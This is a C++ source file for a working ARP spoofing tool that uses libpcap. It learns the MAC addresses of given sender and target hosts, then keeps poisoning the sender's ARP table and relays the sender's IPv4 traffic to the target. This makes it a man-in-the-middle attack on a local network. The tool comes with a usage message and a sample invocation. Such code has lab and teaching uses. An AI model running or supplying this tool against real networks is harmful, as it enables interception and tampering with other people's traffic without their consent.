#include <cstdio>
#include <net/if.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <fstream>
#include <iostream>
#include <sys/ioctl.h>
#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/wait.h>
#include <cstdint>
#include <netinet/ip.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_mac_addr(char* interface, Mac& attackerMac){
    string path=interface;
    ifstream fp ("/sys/class/net/" + path + "/address");
    string macaddr;
    fp >> macaddr;
    fp.close();
    attackerMac = macaddr;
}

void get_ip(char* interface, Ip& attackerIp ){

    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::cerr << "Socket creation failed." << std::endl;
        return ;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        std::cerr << "Failed to get IP address." << std::endl;
        return ;
    }

   attackerIp = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void send_arp_packet(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, int req_check ){

	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (req_check==1){
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else{
		packet.arp_.op_=htons(ArpHdr::Reply);
	}
	
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

int ipv4_arp_reply_checker(struct EthArpPacket * arp_packet,Ip sender_ip,Ip attackerIp){
	if(arp_packet->eth_.type() != EthHdr::Arp)
		return 0;
	if(arp_packet->arp_.op() != ArpHdr::Reply)
		return 0;
	if(arp_packet->arp_.sip() == sender_ip && arp_packet->arp_.tip() == attackerIp){
	
		return 1;
	}
	else{
		return 0;
	}

}

void get_mac_address_by_ip(pcap_t* handle, Mac& senderMac, Mac& attackerMac, Ip& senderIp, Ip&attackerIp){
	Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
	Mac zero = Mac("00:00:00:00:00:00");
	Mac smac;
	send_arp_packet(handle, broadcast, senderMac,attackerMac, attackerIp, zero, senderIp, 1 );
	int res;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		struct EthArpPacket *eth_arp_packet = (struct EthArpPacket *)packet;
		if (ipv4_arp_reply_checker(eth_arp_packet,senderIp,attackerIp)){
			senderMac=eth_arp_packet->arp_.smac();
			break;
		}
	}
}

int parse_packet(const u_char* packet,Ip& senderIp){
	struct EthHdr* ethHdr = (EthHdr*)packet;
	if (ethHdr->type() == EthHdr::Arp) {
		return 1;
	} 

	else if (ethHdr->type() == EthHdr::Ip4 ) {
		return 2;
	}
	else{
		return 0;
	}
}


void arp_spoofing(pcap_t* handle, Mac& attackerMac, Mac& senderMac, Mac& targetMac,Ip& senderIp, Ip& targetIp){
	pid_t pid = fork();
	int select;
	
	if (pid ==0){
		//if pid ==0: arp table infecting
		while(true){
			cout<<"Sender's ARP Table infecting\n";
			send_arp_packet(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp,0 );		
			sleep(10);
		}
	}
	else if (pid>0){
		while(true){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			struct EthHdr* ethHdr = (EthHdr*)packet;
			if ((ethHdr->smac_ != senderMac)||(ethHdr->dmac()!=attackerMac)) {
				continue;
			}

			select=parse_packet(packet,senderIp);
			if (select==0){
				continue;
			}

			else if (select==1){
				//if arpHdr->== arp
				struct ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
				// if header==request and header == targetip : reinfecting
				if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {	
					cout<<"Sender's ARP Table reinfecting\n";		
					send_arp_packet(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, 0 );
				}
			}
			else if (select==2){
				// if arpHdr ==ipv4
				//used libnet.h
				struct iphdr* ipheader = (struct iphdr*)(packet+sizeof(struct EthHdr));
				//if ipheader_send addr=> senderip and destination mac == attackerMac and sendermac == sMac: replay
				if ((Ip(ntohl(ipheader->saddr))==senderIp) && (ethHdr->dmac()==attackerMac) && (ethHdr->smac()==senderMac) ){
					cout <<"Relaying [Packet >> Target]\n";
					ethHdr -> smac() = attackerMac;
					ethHdr -> dmac() = targetMac;
					if(header->len != header->caplen){
						printf("too long packet length\n");
					}
					int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), header->caplen);
					if (res2 != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
				}
			}
		}
	}
	else{
		cout << "fork fail";
		exit(-1);
	}
}

int main(int argc, char* argv[]) {

	if ((argc %2!= 0)||(argc<=3)) {
		usage();
		return -1;
	}
	
	Mac attackerMac , senderMac , targetMac;
	Ip attackerIp, senderIp, targetIp;
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	get_mac_addr(dev, attackerMac);
	get_ip(dev,attackerIp);
	cout << "[attacker MAC Address] " << string(attackerMac) << "\n";
	cout << "[attacker IP Address] " << string(attackerIp) << "\n";
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	pid_t pid;
	int state;

	for (int i = 0; i < ((argc / 2) - 1); i++)
	{
		pid = fork(); 
		if(pid==0){
			senderIp = Ip(argv[2+i*2]);
			targetIp = Ip(argv[3+i*2]);
			get_mac_address_by_ip(handle, senderMac, attackerMac, senderIp, attackerIp); //get sender mac address
			get_mac_address_by_ip(handle, targetMac, attackerMac, targetIp, attackerIp); // get target mac address
			cout << "["<<i+1<<"]";
			cout <<"sender IP : " << argv[i*2+2] << "\n";
			cout << "Target IP : " << argv[i*2+3] << "\n";
			cout << "sender mac address : " << string(senderMac) << "\n";
			cout << "Target mac address : " << string(targetMac) << "\n";
			cout << "== arp spoofing start ==\n";
			arp_spoofing(handle, attackerMac, senderMac, targetMac, senderIp, targetIp);	
		}
		else if (pid>0){
			continue;
		}
		else{
			return -1;
		}
	}
	wait(&state);
	pcap_close(handle);
}